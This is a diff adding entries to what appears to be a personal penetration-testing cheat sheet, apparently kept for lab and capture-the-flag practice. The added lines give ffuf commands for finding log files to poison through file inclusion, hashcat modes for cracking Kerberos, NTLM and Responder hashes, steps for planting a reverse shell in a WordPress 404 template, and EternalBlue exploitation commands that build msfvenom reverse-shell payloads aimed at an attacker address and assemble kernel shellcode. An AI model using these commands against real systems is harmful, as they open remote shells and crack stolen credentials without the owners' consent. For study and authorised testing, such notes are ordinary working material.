@@ -116,6 +116,12 @@ apt -y install seclists
 ```
 ffuf -w ./SecLists/Discovery/Web-Content/common.txt -u http://192.168.56.125:8080/administration.php?FUZZ-helloworld -fs 65
 ffuf -w ./SecLists/Discovery/Web-Content/common.txt -u 192.168.56.125:8080/administration.php?logfile=<name of file>
+
+ffuf -w /path/to/wordlist -u https://target  -H 'Host: FUZZ.TARGET.DOMAIN'
+# Find log file for poisoning
+cat /usr/share/SecLists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt | grep log > log.txt 
+ffuf -u http://${IP}/LFI.php?file=FUZZ -w log.txt -fr "Failed opening" -o fuzz.txt 
+
 ```
 
 
@@ -328,6 +334,19 @@ sudo systemctl restart service_name.service
 ``` echo ' HASH '  | base64 -d ```
 ### See user sudo privileges
 ''' sudo -l ```
+### Hashing types
+```
+#Mscache V2
+hashcat -m 2100
+#Kerberoast
+hashcat -m 13100
+#ASREP roast
+hashcat -m 18200
+#NTLM
+hashcat -m 1000
+#responder hash
+hashcat -m 5600
+```
 
 
 ## General Commands
@@ -380,6 +399,25 @@ https://www.exploit-db.com/exploits/44976
 ### IIS FTP file upload exploit
 ```
 https://infinitelogins.com/2020/01/20/hack-the-box-write-up-devel-without-metasploit/
+```
+
+### Wordpress non public exploit
+```
+if able to login to the admin panel
+go to apperance and select 404.php, replace content with reverse shell payload, setup listener, go to nonexisting page
+plugin shell upload
+https://sevenlayers.com/index.php/179-wordpress-plugin-reverse-shell
+```
+### Eternal Blue
+```
+#https://github.com/helviojunior/MS17-010
+#Generate payload in exe format and use the send_and_execute.py
+msfvenom -p windows/shel_reverse_tcp EXITFUNC=thread LHOST=IP LPORT=PORT -f exe -o payload.exe
+python2 /opt/MS17-010/send_and_execute.py TARGET_IP payload.exe
+# If this does not work, use the paylaod created by the following commands
+msfvenom -p windows/x64/shell_reverse_tcp -a x64 LHOST=10.10.14.28 LPORT=443 -f raw -o sc_x64_payload.bin
+nasm -f bin eternalblue_kshellcode_x64.asm -o ./sc_x64_kernel.bin
+cat sc_x64_kernel.bin sc_x64_payload.bin > sc_x64.bin
 ```
 
 
